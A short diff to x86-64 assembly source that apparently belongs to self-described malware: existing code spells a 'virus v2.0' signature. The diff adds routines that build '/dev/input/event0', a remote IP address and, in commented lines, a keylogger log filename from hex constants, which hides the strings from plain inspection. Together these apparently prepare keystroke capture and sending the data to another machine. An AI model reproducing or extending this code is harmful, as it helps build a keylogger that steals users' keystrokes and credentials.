@@ -7,6 +7,8 @@ global write_filename_src
 global write_test
 global write_test2
 global write_sign
+global write_event0
+global write_ip
 
 write_exe:
 	mov [rdi], DWORD 0x6578652f
@@ -64,4 +66,21 @@ write_sign:
 	mov [rdi + 0x1c], DWORD 0x20737572
 	mov [rdi + 0x20], DWORD 0x302e3276
 	mov [rdi + 0x24], DWORD 0x0000003e
+	ret
+
+write_event0:
+	mov [rdi], DWORD 0x7665642f
+	mov [rdi + 0x4], DWORD 0x706e692f
+	mov [rdi + 0x8], DWORD 0x652f7475
+	mov [rdi + 0xc], DWORD 0x746e6576
+	mov [rdi + 0x10], DWORD 0x00000030
+	ret
+	
+write_ip: 
+	mov [rdi], DWORD 0x312e3031
+	mov [rdi + 0x4], DWORD 0x2e382e32
+	mov [rdi + 0x8], DWORD 0x00000036
+;	mov [rdi + 0xc], DWORD 0x676f6c79
+;	mov [rdi + 0x10], DWORD 0x2e726567
+;	mov [rdi + 0x14], DWORD 0x00747874
 	ret
